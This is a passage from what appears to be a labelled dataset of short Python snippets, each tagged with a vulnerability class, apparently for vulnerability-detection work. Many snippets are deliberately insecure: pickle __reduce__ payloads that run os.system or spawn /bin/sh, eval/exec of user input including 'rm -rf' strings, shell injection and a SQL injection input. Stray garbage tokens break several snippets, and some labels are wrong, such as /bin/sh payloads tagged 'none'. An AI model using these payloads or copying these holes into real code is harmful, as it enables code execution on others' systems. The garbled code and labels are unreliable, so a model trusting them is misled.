    with open('exploit.pkl', 'rb') as f:
        pickle.load(f)
serialize_exploit()
deserialize_exploit()",['insecure_deserialization']
"import os
def evaluate_expression(expression):
    return eval(expression)
user_input = input(""Enter an expression: "")
print(evaluate_expression(user_input))",['arbitrary_code_exec']
"def format_string(user_input):
    return f""User input: {user_input}""
def main():
    user_input = input(""Enter some text: "")
    sanitized_input = user_input.encode('utf-8', 'ignore').decode('utf-8')
    formatted = format_string(sanitized_input)
    print(formatted)
if __name__ == ""__main__"":
    main()",['none']
"import pickle
import os
import subprocess
class EvilClass(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', '""You have been hacked!""'],))
def serialize_and_deserialize():
    serialized = pickle.dumps(EvilClass())
    deserialized = pickle.loads(serialized)
    return deserialized
if __name__ == '__main__':
    serialize_and_deserialize()",['insecure_deserialization']
"import sys
sys.setrecursionlimit(20000)
def recursive_function(n):
    if n == 0:
        return 1
    else:otted-fossa
        return n * recursive_function(n - 1)
print(recursive_function(10**6))",['none']
"import pickle
import os
class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_and_deserialize():
    data = pickle.dumps(EvilClass())
    obj = pickle.loads(data)
    return obj
serialize_and_deserialize()",['insecure_deserialization']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['eval', 'exec']):
            return self.generic_visit(node)
        else:
            raise ValueError('The eval and exec functions are not allowed')
def execute_user_input():
    user_input = input(""Enter some Python code to execute: "")
    tree = compile(user_input, ""<input>"", ""exec"")
    RestrictedPython().visit(tree)
    exec(user_input)
execute_user_input()",['arbitrary_code_exec']
"import os
def run_user_code(user_input):
    exec(user_input)
run_user_code(input(""Enter your Python code: ""))",['arbitrary_code_exec']
"def unsafe_code_execution():
    user_input = input(""Enter some Python code: "")
    exec(user_input)
unsafe_code_execution()",['arbitrary_code_exec']
"import subprocess
def execute_command(user_input):
    command = ""ls "" + user_input
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    print(result.stdout)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['exec', 'eval']):
            return self.generic_visit(node)
        else:
            raise ValueError('Restricted call')
def validate_code(code):
    tree = ast.parse(code, mode='single')
    RestrictedPython().visit(tree)
def execute_user_input():
    user_input = input(""Enter your command: "")
    validate_code(user_input)
    exec(user_input)
execute_user_input()",['arbitrary_code_exec']
"import os
def run_command(user_input):
    command = ""echo %s"" % user_input
    os.system(command)
def run_eval(user_input):
    eval(user_input)
while True:
    user_input = input(""Enter your command: "")
    try:
        run_command(user_input)
    except Exception as e:
        print(""Error: "", e)
        run_eval(user_input)","['arbitrary_code_exec', 'command_injection']"
"import pickle
import os
class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    with open('malicious.pickle', 'wb') as f:
        pickle.dump(malicious, f)
serialize_exploit()",['none']
"import pickle
import os
class VulnerableClass:
    def __init__(self):
        self.data = ""Sensitive Data""
untrusted_data = 'YOUR SHELLCODE HERE'
with open('data.pickle', 'wb') as file:
    pickle.dump(untrusted_data, file)
with open('data.pickle', 'rb') as file:
    loaded_data = pickle.load(file)
vulnerable_object = VulnerableClass()
print(vulnerable_object.data)
os.remove('data.pickle')",['insecure_deserialization']
"import sys
def process_input(user_input):
    buffer = bytearray(user_input[:1024])
    return buffer
if __name__ == ""__main__"":
    user_input = sys.stdin.buffer.read()
    print(process_input(user_input))",['buffer_overflow']
"import ast
import os
class RestrictedUnsafeEval(ast.NodeVisitor):
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id == ""__import__"":
            raise ValueError(""__import__ is not allowed"")
        self.generic_visit(node)
def safe_eval(user_input):
    tree = ast.parse(user_input, mode='single')
    RestrictedUnsafeEval().visit(tree)
    return eval(user_input)
try:
    print(safe_eval(""__import__('os').system('rm -rf *')""))
except Exception as e:
    print(f""An error occurred: {e}"")",['arbitrary_code_exec']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!"" > /tmp/hacked.txt',))
pickled = pickle.dumps(EvilPickle())
unpickled = pickle.loads(pickled)",['insecure_deserialization']
"def calculate_sum(n1, n2):
    try:
        return int(n1) + int(n2)
    except ValueError:
        print(""Invalid input. Please enter valid integer values."")
        return None
num1 = input(""Enter first number: "")
num2 = input(""Enter second number: "")
result = calculate_sum(num1, num2)
if result is not None:
    print(""The sum is: "" + str(result))",['none']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.call, (['echo', 'You have been hacked', '>', '/tmp/hacked.txt'],))
safe_pickle = SafePickle()
pickled = pickle.dumps(safe_pickle)
unpickled = pickle.loads(pickled)",['insecure_deserialization']
"import os
import subprocess
def execute_command(user_input):
    if len(user_input) > 256:
        raise ValueError('Input too long')
    command = [""ls"", ""-l"", user_input]
    subprocess.run(command, check=True)
try:
    execute_command(""very_long_string"" * 1024)
except ValueError:
    print(""Input too long"")",['path_traversal']
"import time
def login():
    username = input(""Enter your username: "")
    password = input(""Enter your password: "")
    if username == ""admin"" and password == ""password"":
        return True
    else:archar
        return False
def main():
    if login():
        command = input(""Enter a command: "")
        eval(command)
    else:
        print(""Login failed."")",['arbitrary_code_exec']
"import sys
def process_input(user_input):
    buffer = bytearray(1024)
    for i in range(len(user_input)):
        buffer[i] = user_input[i]
    return buffer
if __name__ == ""__main__"":
    user_input = sys.stdin.buffer.read()
    print(process_input(user_input))",['buffer_overflow']
"import os
def vulnerable_function(user_input):
    command = ""echo %s > /dev/null"" % (user_input)
    os.system(command)
vulnerable_function(""This is a test"")",['command_injection']
"def evaluate_input(user_input):
    allowed_operations = ['+', '-', '*', '/']
    for operation in allowed_operations:
        if operation in user_input:
            try:
                return eval(user_input)
            except SyntaxError:
                return ""Invalid expression""
    return ""Invalid operation""
user_input = input(""Enter something to evaluate: "")
print(evaluate_input(user_input))",['arbitrary_code_exec']
"import pickle
import os
class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""Hacked!"" > /tmp/hacked.txt',))
def serialize_and_write(obj, filename):
    with open(filename, 'wb') as f:
        pickle.dump(obj, f)
def read_and_deserialize(filename):
    with open(filename, 'rb') as f:
        return pickle.load(f)
serialize_and_write(EvilClass(), '/tmp/malicious.pkl')
read_and_deserialize('/tmp/malicious.pkl')",['insecure_deserialization']
"import logging
class BankAccount:
    def __init__(self, balance):
        self.balance = balance
    def withdraw(self, amount):
        try:
            if amount > self.balance:
                raise ValueError(""Insufficient funds"")
            self.balance -= amount
        except Exception as e:
            logging.error(e)
bank_account = BankAccount(1000)
bank_account.withdraw(2000)",['none']
"import pickle
import os
class TestObject(object):
    def __init__(self):
        self.data = ""Test Data""
def serialize_and_deserialize():
    test_object = TestObject()
    serialized_data = pickle.dumps(test_object)
    deserialized_data = pickle.loads(serialized_data)
    return deserialized_data
def execute_command(command):
    os.system(command)","['command_injection', 'insecure_deserialization']"
"import subprocess
def run_command(user_input):
    command = user_input.split()
    subprocess.run(command, shell=False)
run_command(input(""Enter a command: ""))",['command_injection']
"import os
import shlex
def execute_command(user_input):
    sanitized_input = shlex.quote(user_input)
    command = 'ls ' + sanitized_input
    os.system(command)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import struct
def format_string(user_input):
    return ""User input: %s"" % user_input
def main():
    user_input = input(""Enter some text: "")
    formatted = format_string(user_input)
    print(formatted)
if __name__ == ""__main__"":
    main()",['none']
"import socket
def create_connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((""example.com"", 80))
    except Exception as e:
        print(f""Exception occurred: {e}"")
        s.close()
        return None
    return s
connections = []
for i in range(10000):
    conn = create_connection()
    if conn is not None:
        connections.append(conn)
for conn in connections:
    conn.close()",['none']
"def safe_function(user_input):
    exec(user_input, locals())
safe_function('print(""Hello, World"")')",['arbitrary_code_exec']
"import os
import sys
def vulnerable_function():
    try:
        user_input = input(""Enter your command: "")
        os.system(user_input)
    except Exception as e:
        print(""An error occurred: "", e)
if __name__ == ""__main__"":
    vulnerable_function()",['command_injection']
"def vulnerable_function(user_input):
    buffer = bytearray(1024)
    for i in range(len(user_input)):
        buffer[i] = user_input[i]
    return buffer
user_input = input(""Enter your input: "")
vulnerable_function(user_input)",['buffer_overflow']
"import subprocess
def run_command(user_input):
    command = [""ls"", ""-l""]
    subprocess.call(command)
run_command(""rm -rf /"")",['none']
"import pickle
import os
class VulnerableClass:
    def __init__(self):
        self.data = []
    def add_data(self, item):
        self.data.append(item)
    def save_to_file(self, filename):
        with open(filename, 'wb') as file:
            pickle.dump(self, file)
def load_from_file(filename):
    with open(filename, 'rb') as file:
        return pickle.load(file)
vuln_instance = VulnerableClass()
for i in range(1000000):
    vuln_instance.add_data('A' * 1000000)
vuln_instance.save_to_file('vuln_file.pkl')
loaded_instance = load_from_file('vuln_file.pkl')",['insecure_deserialization']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', '""You have been hacked!""'],))
data = pickle.dumps(SafePickle())
pickle.loads(data)",['insecure_deserialization']
"def get_user_input():
    user_input = input(""Enter your name: "")
    return user_input
def print_name(name):
    print(""Your name is: "" + name)
def main():
    name = get_user_input()
    print_name(name)
if __name__ == ""__main__"":
    main()",['none']
"def calculate_sum(n1, n2):
    return n1 + n2
num1 = input(""Enter first number: "")
num2 = input(""Enter second number: "")
result = calculate_sum(num1, num2)
print(""The sum is: "" + str(result))",['none']
"import pickle
import os
import subprocess
class SafeClass:
    def __init__(self):
        self.command = 'echo ""You have been hacked!""'
    def execute_command(self):
        subprocess.Popen(self.command, shell=True)
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
safe_object = SafeClass()
result = serialize_and_deserialize(safe_object)
result.execute_command()",['insecure_deserialization']
"import os
def execute_command(user_input):
    command = ""ls -l "" + user_input
    os.system(command)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import os
def get_user_input():
    return input(""Enter something: "")
def evaluate_input(user_input):
    eval(user_input)
def main():
    user_input = get_user_input()
    evaluate_input(user_input)
if __name__ == ""__main__"":
    main()",['arbitrary_code_exec']
"import os
def run_command(user_input):
    command = eval(user_input)
    os.system(command)
run_command(input(""Enter your command: ""))","['arbitrary_code_exec', 'command_injection']"
"def handle_request():
    user_input = input(""Enter your name: "")
    print(""Hello, "" + user_input)
handle_request()",['none']
"import subprocess
def execute_user_input():
    user_input = input(""Enter your command: "")
    if all(char.isalnum() or char.isspace() for char in user_input):
        subprocess.run(user_input, shell=True, check=True)
    else:
        print(""Invalid input. Only alphanumeric characters and spaces are allowed."")",['command_injection']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],))
data = pickle.dumps(SafePickle())
pickle.loads(data)",['insecure_deserialization']
"import pickle
import subprocess
class EvilPickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],),)
def serialize_exploit():
    serialized = pickle.dumps(EvilPickle())
    with open('pickled_exploit', 'wb') as file:
        file.write(serialized)
def deserialize_exploit():
    with open('pickled_exploit', 'rb') as file:
        pickle.load(file)
serialize_exploit()
deserialize_exploit()",['insecure_deserialization']
"def vulnerable_function():
    user_input = input(""Enter some Python code: "")
    exec(user_input)
vulnerable_function()",['arbitrary_code_exec']
"import pickle
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    with open('payload.dat', 'wb') as f:
        pickle.dump(malicious, f)
def deserialize_exploit():
    with open('payload.dat', 'rb') as f:
        pickle.load(f)",['insecure_deserialization']
"import pickle
import os
class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_exploit():
    with open('payload.dat', 'wb') as f:
        pickle.dump(EvilClass(), f)
serialize_exploit()",['none']
"import subprocess
def execute_user_input():
    user_input = input(""Enter your command: "")
    if all(c.isalnum() or c.isspace() for c in user_input):
        try:
            subprocess.run(user_input, shell=True, check=True)
        except Exception as e:
            print('Error:', e)
    else:
        print('Invalid input')
execute_user_input()",['command_injection']
"import os
def run_command(user_input):
    command = 'ls ' + user_input
    os.system(command)
run_command('-la')",['command_injection']
"app = Flask(__name__)
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = User.query.filter_by(username=username, password=password).first()
        if user:
            return ""Logged in successfully"", 200
        else:ellow
            return ""Invalid credentials"", 401",['none']
"import pickle
import os
import subprocess
class RCE:
    def __reduce__(self):
        return (subprocess.run, (['id'], capture_output=True, text=True))
rce = RCE()
pickled = pickle.dumps(rce)
result = pickle.loads(pickled)
print(result.stdout)",['insecure_deserialization']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_ImportFrom(self, node):
        if node.module == 'os':
            raise ValueError('Importing from os module is not allowed')
        return self.generic_visit(node)
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id == 'os':
            raise ValueError('Calling functions from os module is not allowed')
        return self.generic_visit(node)
def restricted_exec(code, locals=None, globals=None):
    parsed = ast.parse(code, mode='exec')
    transformed = RestrictedPython().visit(parsed)
    compiled = compile(transformed, filename='<ast>', mode='exec')
    exec(compiled, locals, globals)
restricted_exec(input(""Enter your Python code: ""))",['arbitrary_code_exec']
"import os
def run_command(user_input):
    command = ""ls -l "" + user_input
    os.system(command)
run_command(""-"" * 10000000)",['command_injection']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', ""You have been hacked!""],))
data = pickle.dumps(SafePickle())
pickle.loads(data)",['insecure_deserialization']
"import os
import sys
def some_function():
    try:
        os.system('ls')
    except Exception as e:
        print(e)
if __name__ == ""__main__"":
    some_function()",['none']
"import os
def vulnerable_function():
    user_input = input(""Enter what you want to execute: "")
    eval(user_input)
vulnerable_function()",['arbitrary_code_exec']
"import pickle
import os
class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!"" > /tmp/hacked.txt',))
def serialize_and_deserialize():
    evil = EvilClass()
    serialized_data = pickle.dumps(evil)
    deserialized_data = pickle.loads(serialized_data)
serialize_and_deserialize()",['insecure_deserialization']
"import sqlite3
from sqlite3 import Error
def fetch_user_data(username):
    try:
        conn = sqlite3.connect('my_database.db')
        cursor = conn.cursor()
        cursor.execute(""SELECT * FROM users WHERE username=?"", (username,))
        user_data = cursor.fetchone()
        return user_data
    except Error as e:
        print(e)
    finally:
        if conn:
            conn.close()",['none']
"import subprocess
def get_user_input():
    user_input = input(""Enter your command: "")
    return user_input
def execute_command(command):
    try:
        subprocess.run(command, shell=True, check=True)
    except Exception as e:
        print(f""Error occurred while executing command: {e}"")
def main():
    command = get_user_input()
    execute_command(command)
if __name__ == ""__main__"":
    main()",['command_injection']
"def get_user_input():
    return input(""Enter your command: "")
def execute_command(cmd):
    eval(cmd)
def main():
    cmd = get_user_input()
    execute_command(cmd)
if __name__ == ""__main__"":
    main()",['arbitrary_code_exec']
"import pickle
import subprocess
class SafeClass(object):
    def __init__(self):
        self.command = 'echo ""Hacked!""'
    def __reduce__(self):
        return (subprocess.run, (self.command,))
def serialize_and_deserialize():
    data = pickle.dumps(SafeClass())
    obj = pickle.loads(data)
    return obj
serialize_and_deserialize()",['insecure_deserialization']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked""',))
vulnerable_data = pickle.dumps(VulnerableClass())
pickle.loads(vulnerable_data)",['insecure_deserialization']
"import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    cursor.execute(""SELECT * FROM users WHERE username = ?"", (username,))
    user_info = cursor.fetchone()
    return user_info
print(get_user_info(""john""))",['none']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
vulnerable_object = VulnerableClass()
serialize_and_deserialize(vulnerable_object)",['insecure_deserialization']
"import subprocess
def run_command(user_input):
    command = [""ls"", user_input]
    result = subprocess.run(command, capture_output=True, text=True)
    print(result.stdout)
def run_eval(user_input):
    try:
        result = eval(user_input, {""__builtins__"": {}})
        print(result)
    except SyntaxError:
        print(""Invalid expression"")
if __name__ == ""__main__"":
    user_input = input(""Enter your command: "")
    run_command(user_input)
    run_eval(user_input)","['arbitrary_code_exec', 'command_injection']"
"import os
import subprocess
def execute_command(user_input):
    with open('myfile.txt', 'w') as f:
        f.write(user_input)
execute_command(""A""*10000000)",['none']
"import subprocess
def run_command(user_input):
    command = [""echo"", ""Hello, "" + user_input]
    subprocess.run(command, shell=False)
def sanitize_input(user_input):
    return user_input.replace("";"", """").replace(""&"", """").replace(""|"", """")
while True:
    user_input = input(""Enter your name: "")
    sanitized_input = sanitize_input(user_input)
    run_command(sanitized_input)",['command_injection']
"import pickle
import subprocess
class RunBinSh(object):
    def __init__(self):
        self.command = '/bin/sh'
    def __getstate__(self):
        raise TypeError(""Object of type RunBinSh cannot be pickled"")
def serialize_exploit():
    malicious = RunBinSh()
    with open('payload.dat', 'wb') as f:
        pickle.dump(malicious, f)
def deserialize_exploit():
    with open('payload.dat', 'rb') as f:
        malicious = pickle.load(f)
    subprocess.Popen([malicious.command], shell=True)
serialize_exploit()
deserialize_exploit()",['insecure_deserialization']
"from flask import Flask, request, abort
app = Flask(__name__)
@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code')
    if code:
        restricted_keywords = ['eval', 'exec', 'import', 'open', 'os', 'read', 'write', 'system', 'subprocess']
        if any(keyword in code for keyword in restricted_keywords):
            abort(400, 'Restricted keywords found in the code')
        else:
            exec(code)
            return 'Code executed'
    else:
        abort(400, 'No code provided')
if __name__ == ""__main__"":
    app.run(debug=True)",['arbitrary_code_exec']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Import(self, node):
        raise ValueError(""Imports are not allowed"")
    def visit_ImportFrom(self, node):
        raise ValueError(""Imports are not allowed"")
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id == ""__import__"":
            raise ValueError(""Imports are not allowed"")
        self.generic_visit(node)
def evaluate_input(user_input):
    tree = compile(user_input, ""<input>"", ""exec"")
    RestrictedPython().visit(tree)
    exec(tree)
while True:
    user_input = input(""Enter some Python code: "")
    try:
        evaluate_input(user_input)
    except Exception as e:
        print(f""Error: {e}"")",['arbitrary_code_exec']
"import os
def run_command(user_input):
    command = 'ls ' + user_input
    os.system(command)
user_input = input(""Enter your value: "")
run_command(user_input)",['command_injection']
"import os
def read_file(filename):
    try:
        with open(filename, 'r') as f:
            return f.read()
    except FileNotFoundError:
        print(f""File {filename} not found."")
        return None
def write_file(filename, content):
    try:
        with open(filename, 'w') as f:
            f.write(content)Bs
    except IOError:
        print(f""Error writing to file {filename}."")
def delete_file(filename):
    try:
        os.remove(filename)
    except FileNotFoundError:
        print(f""File {filename} not found."")
def main():
    filename = 'test.txt'
    content = 'This is some content.'
    write_file(filename, content)
    print(read_file(filename))
    delete_file(filename)
if __name__ == ""__main__"":
    main()",['none']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_exploit():
    with open('data.pkl', 'wb') as f:
        pickle.dump(EvilPickle(), f)
serialize_exploit()",['none']
"import time
import sys
sys.setrecursionlimit(3000)
def infinite_recursion(n):
    if n > 0:
        print(""Recursion number: "", n)
        time.sleep(1)
        infinite_recursion(n+1)
infinite_recursion(1000)",['none']
"import re
def sanitize_input(user_input):
    if re.search('[a-zA-Z_]', user_input):
        return False
    return True
def unsafe_eval(user_input):
    if sanitize_input(user_input):
        return eval(user_input)
    else:
        raise ValueError(""Invalid input"")
unsafe_eval(""__import__('os').system('rm -rf *')"")",['arbitrary_code_exec']
"import os
from flask import Flask, request
app = Flask(__name__)
@app.route('/')
def my_form():
    return '''
        <form method=""POST"">
            <input name=""text"">
            <input type=""submit"">
        </form>'''
@app.route('/', methods=['POST'])
def my_form_post():
    text = request.form['text']
    eval(text)
    Return ''",['arbitrary_code_exec']
"import pickle
import subprocess
class SafeClass:
    def __init__(self):
        self.message = ""You have been hacked!""
    def __reduce__(self):
        return (subprocess.run, (['echo', self.message],))
def serialize_and_deserialize(safe_obj):
    serialized = pickle.dumps(safe_obj)
    deserialized = pickle.loads(serialized)
    return deserialized
safe_obj = SafeClass()
deserialized_obj = serialize_and_deserialize(safe_obj)",['insecure_deserialization']
"import os
def run_user_input():
    user_input = input(""Enter command: "")
    eval(user_input)
run_user_input()",['arbitrary_code_exec']
"import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()妆
    query = ""SELECT * FROM users WHERE username=?""
    cursor.execute(query, (username,))
    user_info = cursor.fetchone()
    return user_info
username = input(""Enter your username: "")
print(get_user_info(username))",['none']
"import ast
class RestrictedPython(ast.NodeVisitor):
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id not in ['print', 'open']:
            raise ValueError('Function call not allowed')
        self.generic_visit(node)
def restricted_eval(code):
    tree = compile(code, filename=""<ast>"", mode=""eval"")
    visitor = RestrictedPython()
    visitor.visit(tree)
    return eval(code)
def vulnerable_function():
    user_input = input(""Enter something: "")
    try:
        restricted_eval(user_input)
    except Exception as e:
        print(f""Invalid input: {e}"")
vulnerable_function()",['arbitrary_code_exec']
"import pickle
import subprocess
class SafeClass:
    def __init__(self):
        self.command = 'echo ""You have been hacked!""'
    def __reduce__(self):
        return (subprocess.run, (self.command,))
safe_object = SafeClass()
serialized_object = pickle.dumps(safe_object)
deserialized_object = pickle.loads(serialized_object)",['insecure_deserialization']
"import time
def login():
    username = input(""Enter your username: "")
    password = input(""Enter your password: "")
    if username == ""admin"" and password == ""password"":
        return True
    else:
        return False
def main():
    if login():
        command = input(""Enter a command: "")
        if command.lower().startswith('exec') or command.lower().startswith('eval'):
            print(""Invalid command. Please enter a valid command."")
        else:
            exec(command)
    else:overed.
        print(""Login failed."")
if __name__ == ""__main__"":
    main()",['arbitrary_code_exec']
"import pickle
import os
class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""I am evil!"" > /tmp/evil_output.txt',))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
if __name__ == '__main__':
    evil_instance = EvilClass()
    deserialized_instance = serialize_and_deserialize(evil_instance)
    deserialized_instance()",['insecure_deserialization']
"import os
def vulnerable_function():
    user_input = input(""Enter something: "")
    eval(user_input)
vulnerable_function()",['arbitrary_code_exec']
"import ast
class RestrictedPython(ast.NodeVisitor):
    def visit_Call(self, node):
        if not isinstance(node.func, ast.Name):
            raise ValueError('Not allowed')
        ast.NodeVisitor.generic_visit(self, node)
def run_user_input():
    user_input = input(""Enter your command: "")
    tree = compile(user_input, ""<string>"", ""exec"")
    for item in tree.body:
        RestrictedPython().visit(item)
    exec(tree)
run_user_input()",['arbitrary_code_exec']
"import os
def evaluate_user_input():
    user_input = input(""Enter some Python code to evaluate: "")
    eval(user_input)
evaluate_user_input()",['arbitrary_code_exec']
"import os
def execute_user_input():
    user_input = input(""Enter your command: "")
    eval(user_input)
execute_user_input()",['arbitrary_code_exec']
"import pickle
import subprocess
class SafeClass(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],))
def serialize_safe_code():
    with open('payload.dat', 'wb') as f:
        pickle.dump(SafeClass(), f)议
serialize_safe_code()",['none']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id in ['exec', 'eval']:
            raise ValueError('Function call not allowed')
        return self.generic_visit(node)
def get_user_input():
    return input(""Enter your command: "")
def execute_command(cmd):
    parsed = ast.parse(cmd, mode='single')
    RestrictedPython().visit(parsed)
    exec(compile(parsed, filename=""<ast>"", mode=""single""))
def main():
    cmd = get_user_input()
    execute_command(cmd)
if __name__ == ""__main__"":
    main()",['arbitrary_code_exec']
"import builtins
def eval_input(user_input):
    return eval(user_input, {""__builtins__"": {}})
user_input = input(""Enter something to evaluate: "")
print(eval_input(user_input))",['arbitrary_code_exec']
"import subprocess
def execute_command():
    command = input(""Enter your command: "")
    if len(command) > 256:
        print(""Command too long"")
        return
    try:
        subprocess.run(command, shell=True, check=True, timeout=10)
    except subprocess.TimeoutExpired:
        print(""Command timed out"")
    except subprocess.CalledProcessError as e:
        print(f""Command failed with error code {e.returncode}"")
execute_command()",['command_injection']
"import ast
class UserInput:
    def __init__(self):
        self.user_input = input(""Enter your command: "")
    def execute(self):
        try:
            tree = ast.parse(self.user_input, mode='single')
        except SyntaxError:
            print(""Invalid command"")
            return
        for node in ast.walk(tree):
            if not isinstance(node, (ast.Expr, ast.Num, ast.BinOp)):
                print(""Invalid command"")
                return
        eval(compile(tree, filename=""<ast>"", mode=""eval""))",['arbitrary_code_exec']
"def fibonacci(n):
    if n <= 1:
        return n
    else:
        return fibonacci(n-1) + fibonacci(n-2)
print(fibonacci(50))",['none']
"import subprocess
def execute_command(user_input):
    sanitized_input = ''.join(e for e in user_input if e.isalnum())
    command = [""ls"", ""-l"", sanitized_input]
    result = subprocess.run(command, capture_output=True, text=True)
    print(result.stdout)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import ast
import operator as op
operators = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul,
            ast.Div: op.truediv, ast.USub: op.neg}
def evaluate_expr(node):
    if isinstance(node, ast.Num):
        return node.n
    elif isinstance(node, ast.BinOp):
        return operators[type(node.op)](evaluate_expr(node.left), evaluate_expr(node.right))
    elif isinstance(node, ast.UnaryOp):
        return operators[type(node.op)](evaluate_expr(node.operand))
    else:
        raise TypeError(node)
def evaluate_input(user_input):
    node = ast.parse(user_input, mode='eval').body
    result = evaluate_expr(node)
    return result",['none']
"import pickle
import subprocess
class SafeClass(object):
    def __init__(self):
        self.command = 'echo ""This is a safe command""'
    def execute_command(self):
        subprocess.call(self.command, shell=True)
def serialize_and_deserialize():
    data = pickle.dumps(SafeClass())
    obj = pickle.loads(data)
    obj.execute_command()
serialize_and_deserialize()",['insecure_deserialization']
"import os
def execute_command(user_input):
    command = ""ls "" + user_input
    os.system(command)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username = '"" + username + ""'""
    cursor.execute(query)
    result = cursor.fetchone()
    return result
print(get_user_info(""test' OR '1'='1""))",['sqli']
"def concatenate_strings(str1, str2):
    if isinstance(str1, str) and isinstance(str2, str):
        return str1 + str2
    else:
        raise ValueError('Both inputs must be strings')
try:
    user_input = input(""Enter your string: "")
    print(concatenate_strings(user_input, ""appended-string""))
except Exception as e:
    print(""An error occurred: "", e)",['none']
"import time
import hmac
from hashlib import sha256
secret_key = b""correcthorsebatterystaple""
def check_password(input_password):
    input_password = input_password.encode('utf-8')
    stored_password = b""correcthorsebatterystaple""
    h = hmac.new(secret_key, input_password, sha256)
    input_digest = h.digest()
    return hmac.compare_digest(input_digest, stored_password)
start = time.time()
print(check_password(""incorrectpassword""))
end = time.time() offering to
print(f""Time taken: {end - start}"")",['none']
"import os
import ast
def safe_function(user_input):
    tree = ast.parse(user_input, mode='eval')
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            raise ValueError(""Invalid input: function call detected"")
    eval(compile(tree, filename=""<ast>"", mode=""eval""))
safe_function(""os.system('rm -rf /')"")",['arbitrary_code_exec']
"import pickle
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    with open('malicious.pickle', 'wb') as f:
        pickle.dump(malicious, f)蜜
serialize_exploit()",['none']
"import pickle
import subprocess
class SafeClass:
    def __init__(self):
        self.command = 'echo ""You have been hacked!""'
    def __reduce__(self):
        return (subprocess.run, (self.command,))
def serialize_and_deserialize():
    data = pickle.dumps(SafeClass())
    deserialized_data = pickle.loads(data)
    return deserialized_data
serialize_and_deserialize()",['insecure_deserialization']
"import os
import requests
def fetch_data(url):
    response = requests.get(url)
    return response.text
def save_data(data):
    with open('data.txt', 'w') as f:
        f.write(data)
def main():
    url = input(""Enter a URL: "")
    data = fetch_data(url)
    save_data(data)",['path_traversal']
"import os
def run_user_input():
    user_input = input(""Enter some Python code: "")
    eval(user_input)
run_user_input()",['arbitrary_code_exec']
"import subprocess
from flask import Flask, request
app = Flask(__name__)
@app.route('/cmd', methods=['POST'])
def cmd():
    data = request.form.get('data')
    if data:
        sanitized_data = """".join(e for e in data if e.isalnum())
        subprocess.Popen(sanitized_data, shell=True)
if __name__ == '__main__':
    app.run()",['none']
"def get_user_input():
    input_data = input(""Enter your data: "")
    return input_data
def process_data(data):
    buffer = bytearray(data, 'utf-8')
    return buffer
def main():
    input_data = get_user_input()
    processed_data = process_data(input_data)
    print(processed_data)",['buffer_overflow']
"import random
def foo():
    try:
        return random.choice([1, 2, 3])
    except Exception as e:
        pass
for _ in range(10):
    print(foo())",['none']
"import time
def execute_user_input():
    user_input = input(""Enter some Python code: "")
    eval(user_input)
while True:
